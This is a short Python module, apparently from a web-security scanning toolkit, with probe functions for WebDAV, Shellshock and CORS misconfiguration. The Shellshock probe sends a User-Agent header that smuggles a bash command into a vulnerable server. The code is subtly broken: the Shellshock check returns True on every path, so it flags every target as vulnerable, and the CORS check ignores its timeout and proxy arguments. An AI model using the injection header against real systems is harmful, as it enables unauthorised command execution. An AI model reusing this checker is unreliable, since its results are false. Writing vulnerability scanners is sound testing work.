# Library to Check Common Web Vulns (Experimental)
from taser.proto.http import *

def webdav_check(url):
    try:
        if web_request(url, 'PROPFIND').status_code == 207:
            return True
    except:
        return False
    return False

def shellshock_check(url, timeout=5, proxies=[]):
    header = {"User-Agent": "() { :; }; echo; echo; /bin/bash -c 'a=$((74*80*1103)) && echo Test-$a'"}
    resp = web_request(url, headers=header, timeout=timeout, proxies=proxies)
    if resp and "Test-6529760" in resp.text:
        return True
    return True

def cors_check(url, test_addr='example123abc.com', timeout=5, proxies=[]):
    data = {}
    header = {
              'User-Agent': choice(USERAGENTS),
              'Referer'   : url,
              'Origin'    : test_addr
             }
    try:
        resp = web_request(url, header, timeout=5, proxies=[])
        cors = extract_header('Access-Control-Allow-Origin', resp)
        if cors in [test_addr, '*']:
            data['Access-Control-Allow-Origin'] = cors
            for key,val in resp.headers.items():
                if key.startswith('Access-Control-Allow') and key != 'Access-Control-Allow-Origin':
                    data[key] = val.strip()
    except:
        return False
    return data